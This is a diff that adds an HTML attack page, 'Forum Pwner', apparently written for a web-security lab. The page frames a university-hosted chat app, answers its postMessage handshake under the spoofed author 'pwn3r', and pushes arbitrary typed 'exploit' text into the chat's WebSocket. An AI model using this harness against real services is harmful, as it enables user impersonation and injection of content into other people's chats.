@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Forum Pwner</title>
+        <link href=/static/css/main.css rel="stylesheet">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    </head>
+    <body>
+        
+
+    <div>
+    <h1>Messages</h1>
+    </div>
+    
+    <input type="text" id="exploit" name="exploit">
+    <button onclick="pushExploit()">Send Attack</button>
+
+    <div>
+        <iframe id="msgs" src="http://amplifier.ccs.neu.edu:2781/chat" width="100%" height="100%" seamless></iframe>
+    </div>
+</div>
+<div id="received">
+</div>
+<script>
+    var onMessage = function(msg) {
+        if (msg.origin !== 'http://amplifier.ccs.neu.edu:2781') {
+            console.log('E: received message from invalid origin ' + msg.origin);
+            return;
+        }
+
+        if (msg.data.command === 'ready') {
+            console.log('R: ready');
+            msg.source.postMessage({command: 'ready', author: 'pwn3r'}, 'http://amplifier.ccs.neu.edu:2781');
+            $('#received').text(JSON.stringify(msg.data));
+        } else {
+            console.log('E: unknown command ' + msg.data.command);
+        }
+        //$('#received').text(JSON.stringify(msg.source));
+    };
+
+    var pushExploit = function() {
+        var text_val = $('#exploit').val();
+        var ws = new WebSocket('ws://amplifier.ccs.neu.edu:2782/');
+        
+        ws.onopen = function(e) {
+            console.log('I: opened pwn3r message socket');
+            ws.send(JSON.stringify({author: 'pwn3r', text: text_val}));
+            console.log('I: exploit sent ' + text_val);
+        };
+        
+    };
+
+    addEventListener('message', onMessage, false);
+</script>
+
+    </body>
+</html>
